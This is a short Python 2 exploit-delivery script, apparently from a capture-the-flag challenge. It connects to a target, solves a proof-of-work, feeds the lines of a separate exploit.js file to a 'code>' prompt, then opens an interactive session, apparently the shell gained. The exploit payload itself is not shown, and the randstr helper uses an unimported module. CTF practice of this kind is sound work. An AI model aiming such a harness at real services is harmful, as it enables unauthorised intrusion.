#!/usr/local/bin/python2
import time
import telnetlib
import sys
import binascii
import struct
import socket
import random

def randstr(length=10):
    return ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(length))


def log(s):
    print "[\033[0;32m***\033[0m] %s" % s

HOST = "127.0.0.1" if len(sys.argv) < 2 else sys.argv[1]
PORT = 4444 if len(sys.argv) < 2 else int(sys.argv[2])
TARGET = (HOST, PORT)

sock = None
try:
    sock = socket.create_connection(TARGET)
except:
    log("FAILED TO ESTABLISH SOCKET, ABORTING!!!")
    sys.exit(1)


def ru(delim):
    buf = ""
    while not delim in buf:
        buf += sock.recv(1)
    return buf

def interact():
    log("Switching to interactive mode")
    t = telnetlib.Telnet()
    t.sock = sock
    t.interact()

import subprocess
def solve_pow(task):
    sol = subprocess.check_output(["./pow.py", task])
    sol = sol.split("\n")[-2]
    assert "Solution" in sol
    sol = sol.split(": ")[1]
    log("sol is %s" % sol)
    return sol

p32 = lambda v: struct.pack("<I", v)
p64 = lambda v: struct.pack("<Q", v)
u32 = lambda v: struct.unpack("<I", v)[0]
u64 = lambda v: struct.unpack("<Q", v)[0]
sa = lambda s: sock.sendall(s)

log("Let's pwn")


ru("challenge: ")

chall = ru("\n").rstrip()



log(chall)
sa(solve_pow(chall) + "\n")

code = ""

with open("exploit.js", "r") as f:
    code = f.readlines()


for l in code:
    ru("code> ")
    sa(l)

sa("END_OF_PWN\n")
interact()
